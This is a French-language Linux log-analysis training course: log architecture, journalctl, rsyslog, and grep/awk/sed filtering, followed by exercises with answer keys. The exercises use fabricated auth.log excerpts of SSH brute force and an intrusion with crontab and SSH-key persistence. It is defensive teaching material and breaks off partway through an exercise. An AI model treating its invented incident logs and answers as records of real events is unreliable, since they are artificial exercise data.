# TP Linux — Maîtrise des Logs Système
### De Zéro à Expert · Journalisation · Audit · Cybersécurité

---

> **Public visé** : Débutants → Analystes SOC / Administrateurs confirmés  
> **Durée estimée** : 8 à 14 heures (selon niveau)  
> **Environnement** : Linux (Ubuntu/Debian recommandé) — machine virtuelle conseillée  
> **Convention** : `$` = utilisateur standard · `#` = root · `→` = sortie attendue · `⚠️` = danger · `🔴` = log critique · `🟡` = log suspect · `🟢` = log normal

---

## TABLE DES MATIÈRES

```
NIVEAU 1 — FONDATIONS
  Module 1 : Architecture de la journalisation Linux
  Module 2 : Les fichiers de logs essentiels
  Module 3 : Lire et naviguer dans les logs

NIVEAU 2 — OUTILS ET MANIPULATION
  Module 4 : journalctl — maîtrise complète
  Module 5 : rsyslog et syslog-ng
  Module 6 : Filtrage, grep, awk, sed sur les logs

NIVEAU 3 — ANALYSE ET CORRÉLATION
  Module 7 : Logs d'authentification — exercices réels
  Module 8 : Logs système et kernel — exercices réels
  Module 9 : Logs applicatifs — exercices réels

NIVEAU 4 — CYBERSÉCURITÉ ET LOGS D'ATTAQUES
  Module 10 : Reconnaissance des patterns d'attaque
  Module 11 : Logs post-intrusion réels (2023-2024)
  Module 12 : Investigation forensique sur logs

NIVEAU 5 — EXPERT
  Module 13 : auditd — surveillance avancée
  Module 14 : SIEM et centralisation des logs
  Module 15 : Cas pratiques CTF / SOC analyst
```

---

# ═══════════════════════════════════════════════════
# NIVEAU 1 — FONDATIONS
# ═══════════════════════════════════════════════════

---

## MODULE 1 — Architecture de la Journalisation Linux

### 1.1 Vue d'ensemble du pipeline de journalisation

```
┌─────────────────────────────────────────────────────────────────────┐
│                    PIPELINE DE JOURNALISATION LINUX                  │
│                                                                      │
│  Applications     Noyau Linux      Systemd Services                  │
│      │                │                  │                           │
│      ▼                ▼                  ▼                           │
│  syslog()         printk()         journal API                       │
│      │                │                  │                           │
│      └────────────────┴──────────────────┘                           │
│                        │                                             │
│                        ▼                                             │
│               ┌─────────────────┐                                    │
│               │   systemd-      │  ← Journal binaire                 │
│               │   journald      │    /run/log/journal/               │
│               └────────┬────────┘    /var/log/journal/               │
│                        │                                             │
│               ┌────────▼────────┐                                    │
│               │    rsyslog /    │  ← Fichiers texte                  │
│               │   syslog-ng     │    /var/log/syslog                 │
│               └────────┬────────┘    /var/log/auth.log               │
│                        │             /var/log/kern.log               │
│                        ▼             etc.                            │
│               Stockage local / Serveur distant / SIEM                │
└─────────────────────────────────────────────────────────────────────┘
```

### 1.2 Les niveaux de sévérité (RFC 5424)

```
┌──────┬───────────────┬─────────────────────────────────────────────┐
│ Num. │  Niveau       │  Signification                              │
├──────┼───────────────┼─────────────────────────────────────────────┤
│  0   │  EMERGENCY    │  Système inutilisable — action immédiate    │
│  1   │  ALERT        │  Action immédiate requise                   │
│  2   │  CRITICAL     │  Condition critique                         │
│  3   │  ERROR        │  Erreur — fonctionnement dégradé            │
│  4   │  WARNING      │  Avertissement — comportement anormal       │
│  5   │  NOTICE       │  Événement normal mais significatif         │
│  6   │  INFO         │  Message informatif                         │
│  7   │  DEBUG        │  Informations de débogage                   │
└──────┴───────────────┴─────────────────────────────────────────────┘

Mnémotechnique : "Every Angry Coder Eventually Will Notice It's Debuggable"
```

### 1.3 Les facilities syslog

```
┌───────────────┬──────────────────────────────────────────────────┐
│  Facility     │  Source                                          │
├───────────────┼──────────────────────────────────────────────────┤
│  kern         │  Messages du noyau                               │
│  user         │  Messages des processus utilisateur              │
│  mail         │  Sous-système mail                               │
│  daemon       │  Démons système (sshd, cron...)                  │
│  auth         │  Sécurité et authentification                    │
│  syslog       │  Messages internes syslogd                       │
│  lpr          │  Sous-système impression                         │
│  news         │  Sous-système news USENET                        │
│  cron         │  Cron et at                                      │
│  local0-7     │  Usage local personnalisable                     │
└───────────────┴──────────────────────────────────────────────────┘
```

### 1.4 Structure d'un message syslog

```
Format RFC 3164 (traditionnel) :
<PRIORITY>TIMESTAMP HOSTNAME PROGRAM[PID]: MESSAGE

Exemple :
Jan 10 09:23:47 webserver01 sshd[12345]: Failed password for root from 192.168.1.100 port 42156 ssh2
│              │            │      │     │
│              │            │      │     └── Message
│              │            │      └─── PID du processus
│              │            └── Programme source
│              └── Nom d'hôte
└── Timestamp (pas d'année en RFC 3164 !)

Format RFC 5424 (moderne) :
<PRIORITY>VERSION TIMESTAMP HOSTNAME APP-NAME PROCID MSGID [STRUCTURED-DATA] MESSAGE

Exemple journald :
2024-01-10T09:23:47.123456+01:00 webserver01 sshd 12345 - - Failed password...
```

---

## MODULE 2 — Les Fichiers de Logs Essentiels

### 2.1 Cartographie des logs Linux

```bash
# Vue d'ensemble
$ ls -lh /var/log/
→ drwxr-x--- 2 root    adm      4096 jan 10 /var/log/apt/
→ -rw-r----- 1 syslog  adm    245760 jan 10 /var/log/auth.log
→ -rw-r----- 1 root    adm    102400 jan 10 /var/log/boot.log
→ drwxr-xr-x 2 root    root     4096 jan 10 /var/log/cups/
→ -rw-r----- 1 root    adm      8192 jan 10 /var/log/dpkg.log
→ drwxr-xr-x 3 root    root     4096 jan 10 /var/log/journal/
→ -rw-r----- 1 syslog  adm    512000 jan 10 /var/log/kern.log
→ -rw-rw-r-- 1 root    utmp   292292 jan 10 /var/log/lastlog
→ -rw-r----- 1 syslog  adm   1048576 jan 10 /var/log/syslog
→ -rw-rw-r-- 1 root    utmp    77568 jan 10 /var/log/wtmp
```

### 2.2 Description détaillée de chaque log

```
/var/log/syslog (ou /var/log/messages sur RHEL/CentOS)
  → Journal général du système
  → Tous les messages des démons et services
  → Point de départ de toute investigation

/var/log/auth.log (ou /var/log/secure sur RHEL)
  → Toutes les authentifications (SSH, sudo, su, PAM)
  → 🔴 CRITIQUE pour la détection d'intrusion
  → Connexions réussies ET échouées

/var/log/kern.log
  → Messages du noyau Linux (printk)
  → Erreurs matérielles, drivers, OOM killer
  → Paniques noyau

/var/log/boot.log
  → Processus de démarrage
  → Services démarrés/échoués au boot

/var/log/dpkg.log
  → Installations/suppressions de paquets
  → 🟡 Important : détecte l'installation de backdoors

/var/log/apt/history.log
  → Historique détaillé des opérations apt
  
/var/log/cron.log (ou dans syslog)
  → Exécutions de tâches planifiées
  → 🔴 Vecteur d'attaque fréquent (persistence)

/var/log/wtmp
  → Historique binaire de toutes les connexions
  → Lire avec : last -f /var/log/wtmp

/var/log/btmp
  → Tentatives de connexion échouées (binaire)
  → Lire avec : lastb -f /var/log/btmp

/var/log/lastlog
  → Dernière connexion de chaque utilisateur (binaire)
  → Lire avec : lastlog

/var/log/faillog
  → Compteur d'échecs d'authentification
  → Lire avec : faillog

/var/log/audit/audit.log
  → Journal auditd (si installé)
  → 🔴 Le plus complet pour la forensique

/var/log/nginx/access.log
/var/log/nginx/error.log
  → Logs du serveur web Nginx

/var/log/apache2/access.log
/var/log/apache2/error.log
  → Logs du serveur web Apache
```

### 2.3 Rotation des logs

```bash
# logrotate gère la rotation automatique
$ cat /etc/logrotate.conf
$ ls /etc/logrotate.d/

# Exemple de configuration
$ cat /etc/logrotate.d/syslog
→ /var/log/syslog
→ {
→     rotate 7          # garder 7 fichiers
→     daily             # rotation quotidienne
→     missingok         # pas d'erreur si absent
→     notifempty        # ne pas rotater si vide
→     delaycompress     # compresser après 1 rotation
→     compress          # compresser les anciens
→     postrotate        # script après rotation
→         /usr/lib/rsyslog/rsyslog-rotate
→     endscript
→ }

# Fichiers après rotation :
$ ls /var/log/syslog*
→ /var/log/syslog            ← actuel
→ /var/log/syslog.1          ← hier
→ /var/log/syslog.2.gz       ← avant-hier (compressé)
→ /var/log/syslog.3.gz
→ ...

# Forcer une rotation manuelle
$ sudo logrotate -f /etc/logrotate.d/syslog

# Vérifier sans appliquer
$ sudo logrotate -d /etc/logrotate.conf
```

---

## MODULE 3 — Lire et Naviguer dans les Logs

### 3.1 Commandes de lecture de base

```bash
# Afficher les dernières lignes (temps réel)
$ tail -f /var/log/syslog
$ tail -n 100 /var/log/auth.log    # 100 dernières lignes
$ tail -f -n 50 /var/log/syslog    # 50 lignes + suivi temps réel

# Lire depuis le début
$ head -n 50 /var/log/syslog
$ cat /var/log/auth.log

# Navigation interactive
$ less /var/log/syslog
# Dans less :
#   G         → aller à la fin
#   g         → aller au début
#   /pattern  → chercher pattern
#   n         → occurrence suivante
#   N         → occurrence précédente
#   F         → follow (comme tail -f)
#   q         → quitter

# Lire les fichiers compressés
$ zcat /var/log/syslog.2.gz
$ zgrep "ERROR" /var/log/syslog.2.gz
$ zless /var/log/syslog.3.gz

# Suivre plusieurs fichiers simultanément
$ tail -f /var/log/syslog /var/log/auth.log
$ multitail /var/log/syslog /var/log/auth.log   # (si installé)
```

### 3.2 Lire les logs binaires

```bash
# Historique des connexions (wtmp)
$ last
→ alice    pts/0    192.168.1.50  Wed Jan 10 09:15   still logged in
→ root     pts/1    10.0.0.1      Wed Jan 10 02:33 - 02:47  (00:14)
→ bob      tty1                   Tue Jan  9 18:22 - 18:45  (00:22)
→ reboot   system boot  5.15.0-88  Wed Jan 10 08:00

# Options utiles
$ last -n 20                      # 20 dernières entrées
$ last -a                         # affiche l'IP à la fin
$ last -F                         # timestamps complets
$ last alice                      # connexions de alice seulement
$ last -x                         # inclut shutdown/runlevel

# Tentatives échouées (btmp) — root requis
$ sudo lastb
→ root    ssh:notty  192.168.1.100  Wed Jan 10 09:23 - 09:23  (00:00)
→ admin   ssh:notty  10.0.0.50     Wed Jan 10 09:22 - 09:22  (00:00)

# Dernière connexion de chaque user
$ lastlog
→ Username         Port     From             Latest
→ root             pts/1    10.0.0.1         Wed Jan 10 02:33:00
→ alice            pts/0    192.168.1.50     Wed Jan 10 09:15:12

# Journald (binaire systemd)
$ journalctl -xe
$ journalctl --list-boots          # lister les boots
$ journalctl -b -1                 # boot précédent
```

### 🔬 Exercice 1.1 — Orientation dans les logs

```bash
# 1. Combien de lignes dans le syslog actuel ?
$ wc -l /var/log/syslog

# 2. Quand a eu lieu le dernier redémarrage ?
$ last reboot | head -3

# 3. Quelle est la taille totale de /var/log ?
$ du -sh /var/log/

# 4. Lister tous les fichiers de logs modifiés dans la dernière heure
$ find /var/log -mmin -60 -type f

# 5. Quel service a généré le plus de logs aujourd'hui ?
$ grep "$(date '+%b %e')" /var/log/syslog | \
  awk '{print $5}' | sort | uniq -c | sort -rn | head -10
```

---

# ═══════════════════════════════════════════════════
# NIVEAU 2 — OUTILS ET MANIPULATION
# ═══════════════════════════════════════════════════

---

## MODULE 4 — journalctl — Maîtrise Complète

### 4.1 Syntaxe et options essentielles

```bash
# Structure de base
$ journalctl [OPTIONS] [MATCHES]

# ══ FILTRAGE TEMPOREL ══

$ journalctl --since "2024-01-10"
$ journalctl --since "2024-01-10 09:00:00"
$ journalctl --since "1 hour ago"
$ journalctl --since "yesterday"
$ journalctl --since "today" --until "now"
$ journalctl --since "2024-01-10 08:00" --until "2024-01-10 10:00"

# Formats de temps acceptés :
# "YYYY-MM-DD HH:MM:SS"
# "yesterday", "today", "tomorrow"
# "N minutes/hours/days/weeks ago"
# "@EPOCH_TIMESTAMP"

# ══ FILTRAGE PAR SERVICE ══

$ journalctl -u sshd              # service SSH
$ journalctl -u nginx             # nginx
$ journalctl -u sshd -u nginx     # plusieurs services
$ journalctl -u "ssh*"            # wildcard

# ══ FILTRAGE PAR PRIORITÉ ══

$ journalctl -p err               # erreurs et plus grave
$ journalctl -p 0..3              # emergency à error
$ journalctl -p warning           # warnings et plus grave
$ journalctl -p 4                 # warnings exactement

# ══ FILTRAGE PAR IDENTIFIANT ══

$ journalctl _UID=1001            # par UID
$ journalctl _PID=1234            # par PID
$ journalctl _HOSTNAME=serveur01  # par hostname
$ journalctl _COMM=sshd           # par nom de commande
$ journalctl _EXE=/usr/sbin/sshd  # par chemin exécutable

# ══ AFFICHAGE ══

$ journalctl -n 50                # 50 dernières lignes
$ journalctl -f                   # follow (temps réel)
$ journalctl -r                   # ordre chronologique inverse
$ journalctl --no-pager           # tout afficher d'un coup
$ journalctl -o verbose           # sortie verbeuse (tous les champs)
$ journalctl -o json              # format JSON
$ journalctl -o json-pretty       # JSON indenté
$ journalctl -o cat               # seulement le message
$ journalctl -o short-precise     # timestamps précis à la microseconde

# ══ BOOTS ══

$ journalctl --list-boots
→  -3 abc123 Sat 2024-01-07 08:00:00 → Sun 2024-01-07 22:00:00
→  -2 def456 Sun 2024-01-08 08:00:00 → Mon 2024-01-08 22:00:00
→  -1 ghi789 Mon 2024-01-09 08:00:00 → Tue 2024-01-09 22:00:00
→   0 jkl012 Wed 2024-01-10 08:00:00 → now

$ journalctl -b 0                 # boot actuel
$ journalctl -b -1                # boot précédent
$ journalctl -b abc123            # boot spécifique par ID
```

### 4.2 Requêtes avancées

```bash
# Combiner plusieurs critères (AND implicite)
$ journalctl _UID=0 _COMM=sshd --since "today"

# OR : mettre sur des lignes séparées (avec +)
$ journalctl _COMM=sshd + _COMM=sudo

# Chercher dans les messages
$ journalctl -g "Failed password"
$ journalctl -g "error|warning|critical" --since "today"

# Taille du journal
$ journalctl --disk-usage
→ Archived and active journals take up 2.0G in the file system.

# Vider les anciens journaux
$ sudo journalctl --vacuum-size=500M      # garder max 500M
$ sudo journalctl --vacuum-time=30days    # garder max 30 jours
$ sudo journalctl --vacuum-files=5        # garder max 5 fichiers

# Exporter les logs
$ journalctl --since "today" -u sshd > /tmp/sshd_today.log
$ journalctl -o json --since "today" | gzip > /tmp/journal_$(date +%Y%m%d).json.gz
```

### 4.3 Configuration de journald

```bash
$ sudo cat /etc/systemd/journald.conf

→ [Journal]
→ Storage=persistent       # persistent | volatile | auto
→ Compress=yes
→ Seal=yes                 # scellement cryptographique
→ SplitMode=uid            # journal par UID
→ SyncIntervalSec=5m
→ RateLimitIntervalSec=30s
→ RateLimitBurst=10000
→ SystemMaxUse=2G          # taille max totale
→ SystemKeepFree=1G        # espace libre minimum
→ SystemMaxFileSize=200M   # taille max par fichier
→ MaxRetentionSec=1month   # durée de rétention
→ MaxFileSec=1week         # rotation hebdomadaire
→ ForwardToSyslog=yes      # transmettre à rsyslog
→ ForwardToKMsg=no
→ ForwardToConsole=no

# Appliquer les changements
$ sudo systemctl restart systemd-journald
```

---

## MODULE 5 — rsyslog et syslog-ng

### 5.1 Architecture rsyslog

```bash
# Configuration principale
$ cat /etc/rsyslog.conf

# Structure d'une règle rsyslog :
# FACILITY.SEVERITY    DESTINATION

# Exemples :
# auth,authpriv.*      /var/log/auth.log      ← tout l'auth
# *.*;auth,authpriv.none  /var/log/syslog     ← tout sauf auth
# kern.*               /var/log/kern.log      ← noyau
# mail.*               -/var/log/mail.log     ← mail (-= async)
# *.emerg              :omusrmsg:*            ← urgences → tous les users

# Niveaux cumulatifs (*.warning = warning + error + crit + alert + emerg)
# Niveau exact : auth.=info (seulement info)
# Exclusion : *.!debug (tout sauf debug)
# Tout : facility.* ou *.priority

# Destinations possibles :
# /var/log/fichier.log   → fichier local
# -/var/log/fichier.log  → fichier local (asynchrone)
# @192.168.1.10          → UDP vers serveur distant
# @@192.168.1.10         → TCP vers serveur distant
# :omusrmsg:*            → tous les utilisateurs connectés
# :omusrmsg:alice        → utilisateur spécifique
# |/dev/fifo             → pipe nommé
# ~/dev/null             → /dev/null (ignorer)
```

### 5.2 Configuration avancée rsyslog

```bash
# /etc/rsyslog.d/50-custom.conf — règles personnalisées

# ── Envoyer les logs SSH vers un fichier dédié
if $programname == 'sshd' then /var/log/ssh_detail.log
& stop

# ── Capturer les sudo
if $programname == 'sudo' then /var/log/sudo_audit.log
& stop

# ── Alertes critiques vers fichier séparé
*.emerg;*.alert;*.crit  /var/log/critical.log

# ── Envoyer tout vers un serveur central (TCP)
*.* @@logserver.entreprise.com:514

# ── Template personnalisé (format JSON)
template(name="JSONFormat" type="list") {
    constant(value="{")
    constant(value="\"timestamp\":\"")   property(name="timereported" dateFormat="rfc3339")
    constant(value="\",\"host\":\"")     property(name="hostname")
    constant(value="\",\"severity\":\"") property(name="syslogseverity-text")
    constant(value="\",\"program\":\"")  property(name="programname")
    constant(value="\",\"message\":\"")  property(name="msg" format="json")
    constant(value="\"}\n")
}

# Utiliser le template
*.* action(type="omfile" file="/var/log/syslog_json.log" template="JSONFormat")

# Appliquer les changements
$ sudo systemctl restart rsyslog
$ sudo rsyslogd -N1    # vérifier la configuration sans redémarrer
```

---

## MODULE 6 — Filtrage : grep, awk, sed sur les Logs

### 6.1 grep — Filtrage par pattern

```bash
# Recherche simple
$ grep "Failed" /var/log/auth.log
$ grep -i "error" /var/log/syslog           # insensible à la casse
$ grep -v "cron" /var/log/syslog            # exclure les lignes cron
$ grep -c "Failed" /var/log/auth.log        # compter les occurrences
$ grep -n "panic" /var/log/kern.log         # afficher le numéro de ligne

# Expressions régulières
$ grep -E "(Failed|Invalid|error)" /var/log/auth.log
$ grep -E "^Jan 10" /var/log/syslog         # lignes commençant par la date
$ grep -E "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" /var/log/auth.log

# Contexte autour des occurrences
$ grep -A 3 "kernel panic" /var/log/kern.log    # 3 lignes après
$ grep -B 3 "kernel panic" /var/log/kern.log    # 3 lignes avant
$ grep -C 5 "segfault" /var/log/syslog          # 5 lignes avant ET après

# Recherche récursive dans tous les logs
$ grep -r "Failed password" /var/log/
$ grep -rl "backdoor" /var/log/    # seulement les noms de fichiers

# Recherche dans les fichiers compressés
$ zgrep "Failed" /var/log/auth.log.*.gz

# Compter les IPs qui ont tenté de se connecter
$ grep "Failed password" /var/log/auth.log | \
  grep -oE "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | \
  sort | uniq -c | sort -rn | head -20
```

### 6.2 awk — Extraction et analyse

```bash
# Structure : awk 'condition {action}' fichier
# $1, $2... = champs · NR = numéro de ligne · NF = nombre de champs

# Extraire des champs spécifiques
$ awk '{print $1, $2, $3}' /var/log/syslog        # date + heure
$ awk '{print $5}' /var/log/syslog | sort | uniq -c | sort -rn | head

# Filtrer et extraire
$ awk '/Failed/ {print $11}' /var/log/auth.log     # IPs des échecs SSH

# Compter les erreurs par service
$ awk '/error/ {services[$5]++} END {for (s in services) print services[s], s}' \
  /var/log/syslog | sort -rn | head -10

# Analyser les logs Apache — compter les codes HTTP
$ awk '{print $9}' /var/log/apache2/access.log | \
  sort | uniq -c | sort -rn
→   45231 200
→    1234 304
→     456 404
→      89 500
→      12 403

# Top 10 des IPs sur Apache
$ awk '{print $1}' /var/log/apache2/access.log | \
  sort | uniq -c | sort -rn | head -10

# Calcul de statistiques — taille moyenne des requêtes
$ awk '{sum+=$10; count++} END {print "Moy:", sum/count, "bytes"}' \
  /var/log/apache2/access.log

# Détecter les scans de ports dans syslog
$ awk '/UFW BLOCK/ {print $19}' /var/log/syslog | \
  sort | uniq -c | sort -rn | head -20

# Créer un rapport horaire des erreurs
$ awk '{
  match($3, /([0-9]{2}):[0-9]{2}:[0-9]{2}/, arr)
  hour = arr[1]
  if (/error/ || /Error/) errors[hour]++
  total[hour]++
}
END {
  print "Heure | Erreurs | Total"
  for (h in total) printf "%5s |  %5d  | %5d\n", h, errors[h]+0, total[h]
}' /var/log/syslog | sort
```

### 6.3 sed — Transformation des logs

```bash
# Supprimer les lignes cron des logs pour lisibilité
$ sed '/CRON/d' /var/log/syslog | head -50

# Anonymiser les IPs dans les logs (RGPD)
$ sed 's/[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}/X.X.X.X/g' \
  /var/log/auth.log

# Extraire une plage de dates
$ sed -n '/Jan 10 09:00/,/Jan 10 10:00/p' /var/log/syslog

# Coloriser les niveaux de sévérité (pour affichage terminal)
$ cat /var/log/syslog | \
  sed 's/error/\x1b[31merror\x1b[0m/gi' | \
  sed 's/warning/\x1b[33mwarning\x1b[0m/gi' | \
  sed 's/info/\x1b[32minfo\x1b[0m/gi'
```

### 6.4 Script d'analyse combiné

```bash
#!/bin/bash
# analyse_logs.sh — Rapport quotidien des logs

LOG="/var/log/auth.log"
DATE=$(date '+%b %e')

echo "══════════════════════════════════════════"
echo "  RAPPORT LOGS SSH — $(date '+%Y-%m-%d')"
echo "══════════════════════════════════════════"

echo ""
echo "▶ Tentatives de connexion échouées :"
grep "$DATE" "$LOG" | grep "Failed password" | wc -l

echo ""
echo "▶ Top 10 IPs attaquantes :"
grep "$DATE" "$LOG" | grep "Failed password" | \
  awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10

echo ""
echo "▶ Utilisateurs ciblés :"
grep "$DATE" "$LOG" | grep "Failed password" | \
  awk '{print $9}' | sort | uniq -c | sort -rn | head -10

echo ""
echo "▶ Connexions réussies :"
grep "$DATE" "$LOG" | grep "Accepted" | \
  awk '{print $9, $11}' | sort | uniq -c

echo ""
echo "▶ Activités sudo :"
grep "$DATE" "$LOG" | grep "sudo" | tail -20
```

---

# ═══════════════════════════════════════════════════
# NIVEAU 3 — ANALYSE ET CORRÉLATION
# ═══════════════════════════════════════════════════

---

## MODULE 7 — Logs d'Authentification — Exercices Réels

### 7.1 Comprendre auth.log

```
Anatomie d'un log SSH :

Jan 10 09:23:47 srv01 sshd[12345]: Failed password for root from 192.168.1.100 port 42156 ssh2
│              │      │      │      │                   │          │                │
│              │      │      │      │                   │          │                └── Port source
│              │      │      │      │                   │          └── IP source
│              │      │      │      │                   └── Utilisateur ciblé
│              │      │      │      └── Type d'événement
│              │      │      └── PID de sshd
│              │      └── Programme
│              └── Hostname
└── Timestamp

Types d'événements SSH courants :
  "Failed password"      → Mot de passe incorrect
  "Invalid user"         → Utilisateur inexistant
  "Accepted password"    → Connexion par mot de passe réussie
  "Accepted publickey"   → Connexion par clé SSH réussie
  "Connection closed"    → Connexion fermée normalement
  "Disconnected"         → Déconnexion
  "PAM"                  → Événement PAM
  "session opened"       → Session démarrée
  "session closed"       → Session fermée
```

---

### 🔬 EXERCICE 7.1 — NIVEAU DÉBUTANT : Connexion Normale

**Contexte** : Analyser une séquence de connexion SSH standard.

```
=== LOG À ANALYSER ===

Jan 10 09:15:33 webserver01 sshd[8921]: Accepted publickey for alice from 192.168.1.50 port 52341 ssh2: RSA SHA256:abc123...
Jan 10 09:15:33 webserver01 sshd[8921]: pam_unix(sshd:session): session opened for user alice by (uid=0)
Jan 10 09:15:33 webserver01 sshd[8921]: User child is on pid 8922
Jan 10 09:15:45 webserver01 sudo[8955]:    alice : TTY=pts/1 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/systemctl restart nginx
Jan 10 09:15:45 webserver01 sudo[8955]: pam_unix(sudo:session): session opened for user root by alice(uid=1001)
Jan 10 09:15:46 webserver01 sudo[8955]: pam_unix(sudo:session): session closed for user root
Jan 10 09:22:17 webserver01 sshd[8921]: Disconnected from user alice 192.168.1.50 port 52341
Jan 10 09:22:17 webserver01 sshd[8921]: pam_unix(sshd:session): session closed for user alice
```

**Questions :**

```
1. Quel méthode d'authentification alice a-t-elle utilisé ?
2. Depuis quelle adresse IP s'est-elle connectée ?
3. Quelle commande a-t-elle exécutée en sudo ?
4. Combien de temps a duré la session ?
5. Cette séquence est-elle normale ou suspecte ? Pourquoi ?
```

**Réponses :**

```
1. Clé publique RSA (Accepted publickey)
2. 192.168.1.50
3. /bin/systemctl restart nginx
4. 9:15:33 → 9:22:17 = ~6 minutes 44 secondes
5. NORMALE — connexion légitime avec clé SSH, une seule commande sudo
   documentée, déconnexion propre.
```

---

### 🔬 EXERCICE 7.2 — NIVEAU DÉBUTANT : Brute Force Simple

**Contexte** : Analyser une attaque par brute force basique.

```
=== LOG À ANALYSER ===

Jan 10 02:33:01 webserver01 sshd[3201]: Failed password for root from 185.220.101.45 port 41256 ssh2
Jan 10 02:33:03 webserver01 sshd[3204]: Failed password for root from 185.220.101.45 port 41301 ssh2
Jan 10 02:33:05 webserver01 sshd[3207]: Failed password for root from 185.220.101.45 port 41356 ssh2
Jan 10 02:33:07 webserver01 sshd[3210]: Failed password for admin from 185.220.101.45 port 41412 ssh2
Jan 10 02:33:09 webserver01 sshd[3213]: Invalid user administrator from 185.220.101.45 port 41467 ssh2
Jan 10 02:33:09 webserver01 sshd[3213]: Failed password for invalid user administrator from 185.220.101.45 port 41467 ssh2
Jan 10 02:33:11 webserver01 sshd[3216]: Invalid user ubuntu from 185.220.101.45 port 41523 ssh2
Jan 10 02:33:11 webserver01 sshd[3216]: Failed password for invalid user ubuntu from 185.220.101.45 port 41523 ssh2
Jan 10 02:33:13 webserver01 sshd[3219]: Invalid user pi from 185.220.101.45 port 41578 ssh2
Jan 10 02:33:13 webserver01 sshd[3219]: Failed password for invalid user pi from 185.220.101.45 port 41578 ssh2
Jan 10 02:33:15 webserver01 sshd[3222]: Failed password for root from 185.220.101.45 port 41634 ssh2
Jan 10 02:33:17 webserver01 sshd[3225]: Failed password for root from 185.220.101.45 port 41689 ssh2
Jan 10 02:33:19 webserver01 sshd[3228]: message repeated 5 times: [ Failed password for root from 185.220.101.45 port various ssh2]
```

**Questions :**

```
1. Identifier le type d'attaque
2. Quelle est la fréquence des tentatives ? (tentatives/seconde)
3. Quels utilisateurs ont été ciblés ?
4. L'attaque a-t-elle réussi ?
5. Quelles mesures de protection recommandez-vous ?
```

**Réponses :**

```
1. Brute force SSH / credential stuffing automatisé
2. ~1 tentative toutes les 2 secondes (très rapide = outil automatisé : Hydra, Medusa)
3. root, admin, administrator, ubuntu, pi (liste de comptes par défaut courants)
4. Non — uniquement "Failed password", aucun "Accepted"
5. - fail2ban pour bannir automatiquement après N échecs
   - Désactiver l'authentification par mot de passe (PasswordAuthentication no)
   - Changer le port SSH (sécurité par obscurité, partielle)
   - Bloquer 185.220.101.45 (IP TOR/proxy connue) via iptables
   - Activer l'authentification uniquement par clé
```

---

### 🔬 EXERCICE 7.3 — NIVEAU INTERMÉDIAIRE : Intrusion Réussie

**Contexte** : Analyser une intrusion SSH réelle avec élévation de privilèges.

```
=== LOG À ANALYSER ===

Jan 10 03:14:22 prod-server sshd[7701]: Invalid user deployer from 45.83.64.1 port 55234 ssh2
Jan 10 03:14:24 prod-server sshd[7703]: Invalid user deploy from 45.83.64.1 port 55290 ssh2
Jan 10 03:14:26 prod-server sshd[7705]: Failed password for root from 45.83.64.1 port 55345 ssh2
Jan 10 03:14:28 prod-server sshd[7707]: Failed password for root from 45.83.64.1 port 55400 ssh2
Jan 10 03:17:45 prod-server sshd[7834]: Accepted password for www-data from 45.83.64.1 port 56712 ssh2
Jan 10 03:17:45 prod-server sshd[7834]: pam_unix(sshd:session): session opened for user www-data by (uid=0)
Jan 10 03:18:03 prod-server sudo[7901]: www-data : command not allowed ; TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
Jan 10 03:18:15 prod-server sudo[7912]: www-data : command not allowed ; TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3
Jan 10 03:18:31 prod-server kernel: [87234.123456] audit: type=1400 audit(1704848311.123:89): apparmor="ALLOWED" operation="exec" profile="unconfined" name="/usr/bin/gcc"
Jan 10 03:19:02 prod-server crontab[7956]: (www-data) LIST (www-data)
Jan 10 03:19:45 prod-server crontab[7989]: (www-data) BEGIN EDIT (www-data)
Jan 10 03:20:12 prod-server crontab[7991]: (www-data) END EDIT (www-data)
Jan 10 03:22:33 prod-server sshd[7834]: Disconnected from user www-data 45.83.64.1 port 56712
Jan 10 03:22:45 prod-server sshd[8102]: Accepted publickey for www-data from 45.83.64.1 port 57001 ssh2: RSA SHA256:NEWKEY...
```

**Questions :**

```
1. Quelle est la chronologie de l'attaque ?
2. Quel compte a été compromis ? Comment ?
3. L'attaquant a-t-il réussi à obtenir les droits root ?
4. Que révèle la ligne crontab ?
5. Que signifie la dernière ligne ? Quelle est son implication ?
6. Quelles preuves collecteriez-vous pour l'investigation ?
```

**Réponses :**

```
1. Chronologie :
   03:14 → Brute force (invalid users + failed root)
   03:17 → Intrusion réussie via compte www-data (mot de passe faible !)
   03:18 → Tentatives d'élévation de privilèges via sudo (bloquées)
   03:18 → Tentative de compilation de code (gcc)
   03:19 → Modification du crontab (persistance !)
   03:22 → Déconnexion puis reconnexion avec une NOUVELLE CLÉ SSH

2. Compte www-data compromis par "Accepted password" = mot de passe
   (ce compte NE DEVRAIT PAS avoir de shell ni de mot de passe SSH !)

3. Non via sudo (command not allowed), mais a probablement tenté
   une exploitation locale (gcc → compilation d'exploit kernel/SUID)

4. L'attaquant a modifié le crontab de www-data → PERSISTANCE
   Il a installé une tâche planifiée (backdoor, reverse shell...)

5. Reconnexion avec une CLÉ SSH INCONNUE (NEWKEY) :
   → L'attaquant a ajouté sa clé publique dans ~/.ssh/authorized_keys
   → Il peut maintenant se reconnecter SANS mot de passe
   → Même si le mot de passe est changé, il garde l'accès !

6. Preuves à collecter :
   - Contenu du crontab www-data : crontab -u www-data -l
   - Clés SSH ajoutées : cat /var/www/.ssh/authorized_keys
   - Fichiers créés dans /tmp pendant l'attaque : ls -lat /tmp
   - Historique bash : cat /var/www/.bash_history
   - Connexions réseau actives : ss -tnp
   - Processus suspects : ps aux | grep www-data
```

---

### 🔬 EXERCICE 7.4 — NIVEAU AVANCÉ : Analyse Multi-Sources

**Contexte** : Corrélation de logs de sources multiples après incident.

```
=== LOGS À CORRÉLER ===

--- /var/log/auth.log ---
Jan 10 14:22:01 db-server sshd[9901]: Accepted publickey for backup from 10.0.1.15 port 44321 ssh2
Jan 10 14:22:01 db-server sshd[9901]: pam_unix(sshd:session): session opened for user backup
Jan 10 14:24:55 db-server sudo[9945]: backup : TTY=pts/0 ; PWD=/var/backups ; USER=root ; COMMAND=/usr/bin/mysql -u root -p
Jan 10 14:24:55 db-server sudo[9945]: pam_unix(sudo:session): session opened for user root

